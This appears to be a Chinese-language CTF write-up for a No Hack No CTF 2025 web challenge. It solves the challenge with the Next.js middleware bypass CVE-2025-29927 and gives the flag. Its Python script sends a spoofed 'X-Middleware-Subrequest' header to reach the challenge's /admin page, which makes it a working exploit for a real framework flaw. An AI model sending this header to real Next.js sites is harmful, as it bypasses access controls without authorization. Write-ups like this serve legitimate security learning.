##### tags: `NoHackNoCTF_2025`
# No Hack No CTF 2025 Web : Next Song is 春日影

<style>
.red {
  color: red;
}
.blue {
  color: blue;
}
.purple {
  color: #7D3382;
}
.light_purple {
  color: #810cf5;
}
</style>

<span class=""></span>

## <span class="red">題目</span>

- ![image](https://hackmd.io/_uploads/B116euLBxx.png)

## <span class="red">解題過程</span>

1. **這題可以直接搜關鍵字 `NextJS Vulnerability at /admin` ，會發現這應該是在考 `CVE-2025-29927`，然後因為不確定的因素導致 burp 沒有辦法觀察流量，所以只能自己寫 script 互動**

- **website : https://www.acunetix.com/blog/web-security-zone/next-js-middleware-bypass-vulnerability/**
- ![image](https://hackmd.io/_uploads/B1kzzdUrge.png)

- ![image](https://hackmd.io/_uploads/HJ82zdUHll.png)

&emsp;

2. **`url` 一樣使用題目給的，要設定的只有 header (要塞 payload) ，然後方法先用 `get` (偵察手段)，執行 python payload 就能看到 flag 了 
(ps 我記得某個 CTF ，或是某個論壇也有談過這個 CVE)**

    ```python=
    import requests


    # based on the description of question 
    url = "https://nhnc_next-song.frankk.uk/admin"


    headers = {
        "Host": "nhnc_next-song.frankk.uk",
        "X-Middleware-Subrequest": "middleware:middleware:middleware:middleware:middleware"
    }

    response = requests.get(url, headers=headers, verify=False)

    print("Status Code:", response.status_code)
    print("Response Headers:", response.headers)
    print("Response Body:\n", response.text)
    ```

- ![image](https://hackmd.io/_uploads/S1M-Xd8rxx.png)

- **flag🚩 :`NHNC{ANon_iS_cUtE_RIGhT?}`**

&emsp;

## <span class="red">更新</span>

1. **不能 SSL 是個意外，作者說對付這種 cli 可以直接 curl 就好**

- ![image](https://hackmd.io/_uploads/HkBUULvHgx.png)
